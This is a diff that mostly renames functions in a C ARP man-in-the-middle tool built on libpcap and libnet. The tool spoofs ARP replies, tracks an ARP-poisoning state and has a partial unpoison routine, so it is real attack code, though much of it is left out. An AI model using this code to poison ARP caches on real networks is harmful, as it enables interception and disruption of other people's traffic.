@@ -14,18 +14,14 @@ typedef struct _arp_payload_t {
     u_char ar_tpa[IP_ADDR_LEN];    // Target IP addr
 } arp_payload_t;
 
-static int send_arp_reply_packet(resetter_context_t *, struct sockaddr_in, uint8_t *);
+static void _on_arp_packet_captured(
+        resetter_context_t *ctx,
+        const struct pcap_pkthdr *cap_header,
+        const u_char *packet);
 
-static int send_arp_request_packet(resetter_context_t *, struct sockaddr_in);
+static void _cleanup(resetter_context_t *ctx);
 
-static void on_arp_packet_captured(
-        resetter_context_t *,
-        const struct pcap_pkthdr *,
-        const u_char *);
-
-static void cleanup(resetter_context_t *);
-
-static int init_libnet(resetter_context_t *ctx) {
+static int _init_libnet(resetter_context_t *ctx) {
     int injection_type = LIBNET_LINK; // Layer 2 (link)
     char errbuf[LIBNET_ERRBUF_SIZE];
 
@@ -44,11 +40,11 @@ static int init_libnet(resetter_context_t *ctx) {
     return 0;
 }
 
-static void *arp_mitm_thread(void *vargp) {
+static void *_arp_mitm_thread(void *vargp) {
     thread_node *thread = (thread_node *)vargp;
     resetter_context_t *ctx = &thread->ctx;
 
-    if (listener_start(ctx, on_arp_packet_captured) != 0) {
+    if (listener_start(ctx, _on_arp_packet_captured) != 0) {
         listener_stop(ctx);
         return NULL;
     }
@@ -56,15 +52,15 @@ static void *arp_mitm_thread(void *vargp) {
     return NULL;
 }
 
-static int arp_table_key_cmp(void *key_a, void *key_b) {
+static int _arp_table_key_cmp(void *key_a, void *key_b) {
     return *((uint32_t *)key_a) - *((uint32_t *)key_b);
 }
 
-static uint32_t arp_table_key_hash(void *key, size_t ht_size) {
+static uint32_t _arp_table_key_hash(void *key, size_t ht_size) {
     return *((uint32_t *)key) % (ht_size - 1);
 }
 
-static void arp_test_stuff(resetter_context_t *ctx) {
+static void _arp_test_stuff(resetter_context_t *ctx) {
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(struct sockaddr_in));
 
@@ -94,34 +90,34 @@ int start_arp_mitm_thread(thread_node *thread, char *device) {
     resetter_context_t *ctx = &thread->ctx;
     memset(ctx, 0, sizeof(resetter_context_t));
 
-    ctx->cleanup = cleanup;
+    ctx->cleanup = _cleanup;
     ctx->device = device;
     ctx->arp_poisoning = 1;
     strcpy(ctx->filter_string, "arp");
 
     // Init ARP table
     ctx->arp_table = malloc(sizeof(hash_table));
-    if (ht_init(ctx->arp_table, 100, arp_table_key_cmp, arp_table_key_hash) != 0) {
+    if (ht_init(ctx->arp_table, 100, _arp_table_key_cmp, _arp_table_key_hash) != 0) {
         return -1;
     }
 
     printf("Monitoring ARP traffic on %s ( %s )...\n", device, ctx->filter_string);
 
-    if (init_libnet(ctx) != 0) {
+    if (_init_libnet(ctx) != 0) {
         return -1;
     }
 
-    if (pthread_create(&thread->thread_id, NULL, arp_mitm_thread, (void *)thread) != 0) {
+    if (pthread_create(&thread->thread_id, NULL, _arp_mitm_thread, (void *)thread) != 0) {
         perror("pthread_create() failed");
         return -1;
     }
 
-    //arp_test_stuff(ctx);
+    //_arp_test_stuff(ctx);
 
     return 0;
 }
 
-static char *ether_ntoa(uint8_t *ether_addr) {
+static char *_ether_ntoa(uint8_t *ether_addr) {
     static char addr_buf[18];
     addr_buf[17] = 0;
 
@@ -137,7 +133,7 @@ static char *ether_ntoa(uint8_t *ether_addr) {
     return addr_buf;
 }
 
-static void print_arp_table_entry(hash_table_entry *entry, int index, void *user_arg) {
+static void _print_arp_table_entry(hash_table_entry *entry, int index, void *user_arg) {
     struct sockaddr_in addr;
 
     memset(&addr, 0, sizeof(struct sockaddr_in));
@@ -145,21 +141,21 @@ static void print_arp_table_entry(hash_table_entry *entry, int index, void *user
 
     printf("%s: %s\n",
            inet_ntoa(addr.sin_addr),
-           ether_ntoa((uint8_t *)entry->value));
+           _ether_ntoa((uint8_t *)entry->value));
 }
 
-static void unpoison(resetter_context_t *ctx) {
+static void _unpoison(resetter_context_t *ctx) {
     printf("Removing ARP poison...\n");
     ctx->arp_poisoning = 0;
 
     printf("--- Begin ARP Table ---\n");
-    ht_iter(ctx->arp_table, print_arp_table_entry, NULL);
+    ht_iter(ctx->arp_table, _print_arp_table_entry, NULL);
     printf("--- End ARP Table ---\n");
 
     // TODO: remove arp poison by restoring ctx->arp_table
 }
 
-static struct libnet_ether_addr *get_local_mac_addr(resetter_context_t *ctx) {
+static struct libnet_ether_addr *_get_local_mac_addr(resetter_context_t *ctx) {
     static struct libnet_ether_addr *local_mac_addr = NULL;
 
     // Resolve local MAC address
@@ -172,13 +168,13 @@ static struct libnet_ether_addr *get_local_mac_addr(resetter_context_t *ctx) {
         }
 
         printf("Local MAC address: %s\n",
-               ether_ntoa(local_mac_addr->ether_addr_octet));
+               _ether_ntoa(local_mac_addr->ether_addr_octet));
     }
 
     return local_mac_addr;
 }
 
-static void maybe_print_stats(resetter_context_t *ctx) {
+static void _maybe_print_stats(resetter_context_t *ctx) {
     u_long curr_time;
     struct libnet_stats stat;
 
@@ -197,7 +193,7 @@ static void maybe_print_stats(resetter_context_t *ctx) {
     }
 }
 
-static int send_arp_reply_packet(
+int send_arp_reply_packet(
         resetter_context_t *ctx,
         struct sockaddr_in ip_addr,
         uint8_t *victim_eth_addr) {
@@ -206,17 +202,17 @@ static int send_arp_reply_packet(
     int bytes_written;
     static libnet_ptag_t arp_tag = LIBNET_PTAG_INITIALIZER;
     static libnet_ptag_t eth_tag = LIBNET_PTAG_INITIALIZER;
-    struct libnet_ether_addr *local_mac_addr = get_local_mac_addr(ctx);
+    struct libnet_ether_addr *local_mac_addr = _get_local_mac_addr(ctx);
 
     if (local_mac_addr == NULL) {
         return -1;
     }
 
     eth_src = local_mac_addr->ether_addr_octet;
-    printf("Spoof: Telling %s ", ether_ntoa(victim_eth_addr));
+    printf("Spoof: Telling %s ", _ether_ntoa(victim_eth_addr));
     printf("that %s is-at %s\n",
             inet_ntoa(ip_addr.sin_addr),
-            ether_ntoa(eth_src));
+           _ether_ntoa(eth_src));
 
     // Build ARP packet
     arp_tag = libnet_build_arp(
@@ -271,12 +267,12 @@ static int send_arp_reply_packet(
         return -1;
     }
 
-    maybe_print_stats(ctx);
+    _maybe_print_stats(ctx);
 
     return 0;
 }
 
-static int send_arp_request_packet(resetter_context_t *ctx, struct sockaddr_in ip_addr) {
+int send_arp_request_packet(resetter_context_t *ctx, struct sockaddr_in ip_addr) {
     uint32_t local_ip = libnet_get_ipaddr4(ctx->libnet);
     uint8_t *ip_src = (uint8_t *)&local_ip;
     uint8_t *ip_dst = (uint8_t *)&ip_addr.sin_addr.s_addr;
@@ -285,7 +281,7 @@ static int send_arp_request_packet(resetter_context_t *ctx, struct sockaddr_in i
     int bytes_written;
     static libnet_ptag_t arp_tag = LIBNET_PTAG_INITIALIZER;
     static libnet_ptag_t eth_tag = LIBNET_PTAG_INITIALIZER;
-    struct libnet_ether_addr *local_mac_addr = get_local_mac_addr(ctx);
+    struct libnet_ether_addr *local_mac_addr = _get_local_mac_addr(ctx);
 
     printf("Broadcasting ARP who-has %s\n", inet_ntoa(ip_addr.sin_addr));
 
@@ -348,12 +344,12 @@ static int send_arp_request_packet(resetter_context_t *ctx, struct sockaddr_in i
         return -1;
     }
 
-    maybe_print_stats(ctx);
+    _maybe_print_stats(ctx);
 
     return 0;
 }
 
-static void on_arp_packet_captured(
+static void _on_arp_packet_captured(
         resetter_context_t *ctx,
         const struct pcap_pkthdr *cap_header,
         const u_char *packet) {
@@ -389,20 +385,20 @@ static void on_arp_packet_captured(
     switch (htons(arp_hdr->ar_op)) {
         case ARPOP_REQUEST:
             // req to resolve address
-            printf("arp %s -> ", ether_ntoa(eth_hdr->ether_shost));
-            printf("%s who-has %s ", ether_ntoa(eth_hdr->ether_dhost), inet_ntoa(daddr.sin_addr));
-            printf("tell %s (%s)\n", inet_ntoa(saddr.sin_addr), ether_ntoa(arp_payload->ar_sha));
+            printf("arp %s -> ", _ether_ntoa(eth_hdr->ether_shost));
+            printf("%s who-has %s ", _ether_ntoa(eth_hdr->ether_dhost), inet_ntoa(daddr.sin_addr));
+            printf("tell %s (%s)\n", inet_ntoa(saddr.sin_addr), _ether_ntoa(arp_payload->ar_sha));
 
             // TODO: if IP is in ctx->arp_table, send spoofed reply saying it's from this machine's MAC
             break;
 
         case ARPOP_REPLY:
             // resp to previous request
-            printf("arp %s -> ", ether_ntoa(eth_hdr->ether_shost));
+            printf("arp %s -> ", _ether_ntoa(eth_hdr->ether_shost));
             printf("%s reply %s is-at ",
-                    ether_ntoa(eth_hdr->ether_dhost),
+                   _ether_ntoa(eth_hdr->ether_dhost),
                     inet_ntoa(saddr.sin_addr));
-            printf("%s\n", ether_ntoa(arp_payload->ar_sha));
+            printf("%s\n", _ether_ntoa(arp_payload->ar_sha));
 
             if (ht_get(ctx->arp_table, &saddr.sin_addr.s_addr) == NULL) {
                 entry = ht_init_entry(&saddr.sin_addr.s_addr, sizeof(uint32_t),
@@ -424,8 +420,8 @@ static void on_arp_packet_captured(
     }
 }
 
-static void cleanup(resetter_context_t *ctx) {
-    unpoison(ctx);
+static void _cleanup(resetter_context_t *ctx) {
+    _unpoison(ctx);
 
     if (is_listener_started(ctx)) {
         listener_stop(ctx);
